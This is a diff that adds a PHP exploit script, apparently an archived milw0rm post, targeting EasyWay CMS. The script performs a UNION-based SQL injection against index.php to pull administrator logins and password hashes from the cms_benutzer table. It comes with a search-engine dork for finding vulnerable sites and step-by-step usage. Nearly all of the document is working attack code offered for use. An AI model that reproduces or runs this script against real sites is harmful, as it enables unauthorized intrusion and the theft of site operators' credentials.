@@ -1,0 +1,55 @@
+<?php
+ini_set("max_execution_time",0);
+print_r('
+###############################################################
+#
+#           EasyWay CMS - SQL Injection Exploit     
+#                                                             
+#      Vulnerability discovered by: Lidloses_Auge             
+#      Exploit coded by:            Lidloses_Auge
+#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
+#                                   GPM, Free-Hack
+#      Date:                        30.05.2008
+#      Developer:		    http://www.ta-edv.de/index.php?lg=de&css=1&mid=320&art=1
+#
+###############################################################
+#                                                             
+#      Dork:  inurl:"index.php?css=mid=art="
+#      Admin Panel: [Target]/cms/
+#      Usage: php '.$argv[0].' [Target] [Userid]
+#      Example for "http://www.site.com/index.php?css=1&mid=100&art=1"
+#      => php '.$argv[0].' http://www.site.com 1
+#                                                             
+###############################################################
+');
+if ($argc == 3) {
+echo "\nExploiting in progress:";
+$url = $argv[1];
+$source = file_get_contents($url.'/index.php?mid=null+order+by+100/*');
+$errorcount = substr_count($source,'not a valid MySQL');
+$sql = '/index.php?mid=null+union+select+';
+for ($i = 25; $i>=1; $i--) {
+   $source = file_get_contents($url.'/index.php?mid=null+order+by+'.$i.'/*');
+   if (substr_count($source,'not a valid MySQL')!=$errorcount) {
+      $errorcount2 = $i;
+      $i = 1;
+   }
+}
+for ($j=1; $j<$errorcount2; $j++) {
+   $sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a),';   
+}
+$sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a)+from+cms_benutzer+where+id='.$argv[2].'/*';
+$source = file_get_contents($url.$sql);
+echo "\n";
+if (strpos($source,'::::')!=0) {
+   echo 'User: '.substr($source,strpos($source,'::::')+5,strpos($source,'::1::')-strpos($source,'::::')-5)."\n";
+   echo 'Hash: '.substr($source,strpos($source,'::1::')+5,strpos($source,'::2::')-strpos($source,'::1::')-5)."\n";
+} else {
+   echo 'Exploit failed!'."\n";
+}
+} else {
+echo "\nNot enough arguments!\n";
+}
+?>
+
+# milw0rm.com [2008-05-31]
